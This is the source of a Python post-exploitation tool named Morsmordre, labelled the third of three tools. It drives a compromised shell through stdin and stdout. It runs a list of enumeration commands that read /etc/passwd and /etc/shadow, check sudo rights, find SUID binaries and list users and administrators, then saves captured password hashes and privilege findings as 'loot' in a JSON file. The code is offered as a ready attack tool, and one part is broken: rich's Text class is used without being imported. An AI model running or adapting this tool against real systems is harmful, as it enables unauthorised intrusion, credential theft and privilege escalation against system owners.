---

## Tool 3/3: Morsmordre v1.0

```python
#!/usr/bin/env python3
"""
Morsmordre v1.0 - Red Engine
Automated Post-Exploitation via Stdin/Stdout Bridging
"""

import os
import sys
import json
import asyncio
import re
from datetime import datetime
from typing import List, Dict
from dataclasses import dataclass, asdict

try:
    from rich.console import Console
    from rich.panel import Panel
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

@dataclass
class Loot:
    timestamp: str
    category: str
    data: str
    source: str

class Morsmordre:
    def __init__(self):
        self.console = Console() if RICH_AVAILABLE else None
        self.target = os.getenv('MORSMORDRE_TARGET', 'unknown')
        self.os = os.getenv('MORSMORDRE_OS', 'Linux')
        self.lhost = os.getenv('MORSMORDRE_LHOST', '0.0.0.0')
        self.loot: List[Loot] = []
        self.commands_executed = 0
        
    def banner(self):
        banner = """
    ███╗   ███╗ ██████╗ ██████╗ ███████╗███╗   ███╗ ██████╗ ██████╗ ██████╗ ███████╗
    ████╗ ████║██╔═══██╗██╔══██╗██╔════╝████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██╔════╝
    ██╔████╔██║██║   ██║██████╔╝█████╗  ██╔████╔██║██║   ██║██████╔╝██████╔╝█████╗  
    ██║╚██╔╝██║██║   ██║██╔══██╗██╔══╝  ██║╚██╔╝██║██║   ██║██╔══██╗██╔══██╗██╔══╝  
    ██║ ╚═╝ ██║╚██████╔╝██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║███████╗
    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        """
        if self.console:
            self.console.print(Panel(Text(banner, style="bold red"),
                                   subtitle="[red]v1.0 Red Engine - Autonomous Looting[/red]",
                                   border_style="red"))
        else:
            sys.stderr.write(f"\033[91m{banner}\033[0m\n")
            sys.stderr.write(f"\033[91m>>> Morsmordre v1.0 - Red Engine <<<\033[0m\n\n")
    
    def log(self, msg: str, level: str = "info"):
        ts = datetime.now().strftime("%H:%M:%S")
        prefix = {"info": "[*]", "loot": "[LOOT]", "cmd": "[CMD]", 
                 "error": "[!]", "success": "[+]"}.get(level, "[*]")
        line = f"{prefix} [{ts}] {msg}\n"
        sys.stderr.write(line)
        sys.stderr.flush()
    
    def get_commands(self) -> List[Dict]:
        if "Windows" in self.os:
            return [
                {"cmd": "whoami", "type": "identity"},
                {"cmd": "whoami /priv", "type": "privesc"},
                {"cmd": "systeminfo", "type": "system"},
                {"cmd": "net user", "type": "users"},
                {"cmd": "net localgroup administrators", "type": "users"},
                {"cmd": "ipconfig /all", "type": "network"},
                {"cmd": "tasklist /v", "type": "processes"},
            ]
        else:
            return [
                {"cmd": "id", "type": "identity"},
                {"cmd": "whoami", "type": "identity"},
                {"cmd": "uname -a", "type": "system"},
                {"cmd": "cat /etc/passwd", "type": "credentials"},
                {"cmd": "cat /etc/shadow 2>/dev/null", "type": "credentials"},
                {"cmd": "sudo -l 2>/dev/null", "type": "privesc"},
                {"cmd": "find / -perm -4000 -type f 2>/dev/null", "type": "privesc"},
                {"cmd": "netstat -tulpn 2>/dev/null || netstat -tuln", "type": "network"},
                {"cmd": "ps aux", "type": "processes"},
                {"cmd": "cat /etc/crontab 2>/dev/null", "type": "persistence"},
                {"cmd": "ls -la /home", "type": "users"},
            ]
    
    async def send_command(self, cmd: str) -> str:
        self.log(f"Executing: {cmd}", "cmd")
        sys.stdout.write(f"{cmd}\n")
        sys.stdout.flush()
        
        output = ""
        try:
            loop = asyncio.get_event_loop()
            future = loop.run_in_executor(None, sys.stdin.readline)
            line = await asyncio.wait_for(future, timeout=10.0)
            output += line
            
            while True:
                try:
                    future = loop.run_in_executor(None, sys.stdin.readline)
                    line = await asyncio.wait_for(future, timeout=0.3)
                    if line:
                        output += line
                    else:
                        break
                except asyncio.TimeoutError:
                    break
        except asyncio.TimeoutError:
            self.log("Timeout", "error")
        
        return output.strip()
    
    def analyze(self, cmd: str, output: str, cmd_type: str):
        out_lower = output.lower()
        
        if cmd_type == "credentials" and "root:" in output and "shadow" in cmd:
            if "permission denied" not in out_lower:
                self.log("ROOT HASHES CAPTURED", "loot")
                self.loot.append(Loot(datetime.now().isoformat(), "credentials", output[:1000], cmd))
        
        if cmd_type == "privesc" and ("nopasswd" in out_lower or "(root)" in out_lower):
            self.log("SUDO PRIVILEGE FOUND", "loot")
            self.loot.append(Loot(datetime.now().isoformat(), "privesc", output[:500], cmd))
        
        if "suid" in cmd and output.strip():
            lines = [l for l in output.split('\n') if l.strip() and not l.startswith('find')]
            if lines:
                self.log(f"SUID binaries: {len(lines)}", "loot")
    
    async def run(self):
        self.banner()
        self.log(f"Target: {self.target} | OS: {self.os}", "info")
        self.log("Starting autonomous enumeration", "info")
        
        commands = self.get_commands()
        
        for idx, cmd_info in enumerate(commands):
            self.log(f"[{idx+1}/{len(commands)}] {cmd_info['cmd']}", "cmd")
            output = await self.send_command(cmd_info['cmd'])
            self.commands_executed += 1
            
            if output:
                self.analyze(cmd_info['cmd'], output, cmd_info['type'])
            
            await asyncio.sleep(0.3)
        
        self.log(f"Complete. Commands: {self.commands_executed}", "success")
        self.save_loot()
        sys.stdout.write("exit\n")
        sys.stdout.flush()
    
    def save_loot(self):
        filename = f"morsmordre_{self.target.replace('.', '_')}_{datetime.now().strftime('%H%M%S')}.json"
        data = {
            "target": self.target,
            "os": self.os,
            "timestamp": datetime.now().isoformat(),
            "commands_executed": self.commands_executed,
            "loot": [asdict(l) for l in self.loot]
        }
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        self.log(f"Loot saved: {filename}", "loot")

async def main():
    await Morsmordre().run()

if __name__ == "__main__":
    asyncio.run(main())
